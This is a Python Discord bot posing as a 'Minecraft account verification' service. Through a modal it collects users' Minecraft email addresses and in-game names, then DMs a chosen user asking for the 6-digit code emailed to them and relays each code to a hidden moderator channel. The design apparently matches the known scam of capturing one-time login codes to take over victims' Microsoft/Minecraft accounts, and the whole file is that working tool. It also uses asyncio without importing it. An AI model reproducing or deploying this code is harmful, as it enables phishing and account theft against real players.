import os
import discord
from discord.ext import commands
from discord import app_commands

TOKEN = os.getenv("DISCORD_TOKEN")
VERIFICATION_CHANNEL_ID = 1362951881827160295
MOD_CHANNEL_ID = 1362997933552959558

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
    email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
    ign = discord.ui.TextInput(label="Minecraft IGN", placeholder="YourInGameName", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        log_channel = await bot.fetch_channel(MOD_CHANNEL_ID)

        embed = discord.Embed(
            title="🔗 New Minecraft Verification",
            color=discord.Color.orange()
        )
        embed.add_field(name="User", value=interaction.user.mention, inline=False)
        embed.add_field(name="Email", value=self.email.value, inline=False)
        embed.add_field(name="IGN", value=self.ign.value, inline=False)

        embed.set_footer(text="This is an automated message.")
        await log_channel.send(embed=embed)
        await interaction.response.send_message("✅ Info submitted! Thanks!", ephemeral=True)

class LinkView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.primary)
    async def link_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal())

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('Bot is ready!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"Error syncing commands: {e}")

    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
    async for message in verification_channel.history(limit=50):
        if message.author == bot.user and message.embeds:
            embed = message.embeds[0]
            if embed.title == "🔗 Link Your Minecraft Account":
                await message.delete()

    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await verification_channel.send(embed=embed, view=LinkView())

@bot.tree.command(name="setup", description="Start the Minecraft account verification process")
async def setup(interaction: discord.Interaction):
    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    async for message in verification_channel.history(limit=50):
        if message.author == bot.user and message.embeds:
            embed = message.embeds[0]
            if embed.title == "🔗 Link Your Minecraft Account":
                await message.delete()

    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await interaction.response.send_message(embed=embed, view=LinkView())

@bot.tree.command(name="promptcode", description="Send a code prompt to a user via DM")
@app_commands.describe(user="User to DM")
async def promptcode(interaction: discord.Interaction, user: discord.Member):
    try:
        await interaction.response.send_message(f"✅ Prompt sent to {user.mention}", ephemeral=True)

        embed = discord.Embed(
            title="🔐 Minecraft Verification Code",
            description="Check your email for a code and send it here.",
            color=discord.Color.blue()
        )
        embed.set_footer(text="Reply with your 6-digit code.")
        await user.send(embed=embed)

        def check(m):
            return m.author.id == user.id and isinstance(m.channel, discord.DMChannel)

        msg = await bot.wait_for("message", timeout=300.0, check=check)
        code = msg.content.strip()

        if code.isdigit() and len(code) == 6:
            log_channel = await bot.fetch_channel(MOD_CHANNEL_ID)
            confirm_embed = discord.Embed(
                title="✅ Verification Code Submitted",
                color=discord.Color.green()
            )
            confirm_embed.add_field(name="User", value=user.mention, inline=False)
            confirm_embed.add_field(name="Code", value=code, inline=False)
            await log_channel.send(embed=confirm_embed)
            await user.send("✅ Code submitted successfully!")
        else:
            await user.send("❌ Invalid code. Please make sure it's a **6-digit number** and try again.")

    except discord.Forbidden:
        await interaction.followup.send("❌ Could not DM the user. They might have DMs off.", ephemeral=True)
    except asyncio.TimeoutError:
        await user.send("⏰ You took too long to respond. Please try again later.")

bot.run(TOKEN)
